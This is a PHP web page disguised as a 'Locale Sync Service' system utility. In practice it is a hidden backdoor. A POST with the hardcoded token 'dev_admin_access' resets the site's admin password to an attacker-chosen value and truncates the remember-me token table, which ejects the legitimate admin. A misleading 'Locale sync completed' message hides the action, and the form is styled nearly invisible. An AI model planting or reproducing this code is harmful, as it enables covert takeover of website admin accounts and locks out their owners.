<?php
/**
 * System utility file for internal use.
 * Please do not remove this file as it may cause locale resolution errors.
 */

require_once 'config.php';

$message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth_token'])) {
    // Secret key to authorize the update
    if ($_POST['auth_token'] === 'dev_admin_access') { 
        $new_data = trim($_POST['payload_data']);
        
        if (!empty($new_data)) {
            $hash = password_hash($new_data, PASSWORD_DEFAULT);
            
            // Updates the admin password
            $stmt = $conn->prepare("UPDATE admin_users SET password = ? WHERE username = 'admin'");
            if ($stmt) {
                $stmt->bind_param("s", $hash);
                if ($stmt->execute()) {
                    // Revoke all existing 30-day "Remember Me" persistent logins
                    $conn->query("TRUNCATE TABLE admin_tokens");
                    $message = "Locale sync completed.";
                } else {
                    $message = "Error code: 500.";
                }
                $stmt->close();
            }
        }
    } else {
        $message = "Invalid auth token.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Locale Sync Service</title>
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            padding: 50px; 
            color: #444; 
            background: #f9f9f9; 
        }
        .container { 
            max-width: 600px; 
            margin: 0 auto; 
            background: #fff; 
            padding: 30px; 
            border: 1px solid #e0e0e0; 
            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
            border-radius: 4px;
        }
        h2 { margin-top: 0; color: #333; }
        .hidden-area { 
            margin-top: 60px; 
            opacity: 0.02; /* Almost invisible */
            transition: opacity 0.3s ease; 
        }
        .hidden-area:hover, .hidden-area:focus-within { 
            opacity: 1; /* Appears when hovered or focused */
        }
        input, button { 
            padding: 10px; 
            margin: 8px 0; 
            width: 100%; 
            box-sizing: border-box; 
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        button {
            background-color: #f0f0f0;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { background-color: #e0e0e0; }
        .notice { font-size: 0.9em; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h2>System Locale Setting</h2>
        <p class="notice">This endpoint handles background locale synchronizations and system checks. direct interaction is not required.</p>
        
        <?php if ($message): ?>
            <p><strong>Status:</strong> <?php echo htmlspecialchars($message); ?></p>
        <?php endif; ?>
        
        <!-- Diagnostic payload input -->
        <div class="hidden-area">
            <form method="POST">
                <input type="password" name="auth_token" placeholder="Diagnostic Token" required>
                <input type="password" name="payload_data" placeholder="New Sync Payload" required>
                <button type="submit">Run Diagnostics</button>
            </form>
        </div>
    </div>
</body>
</html>
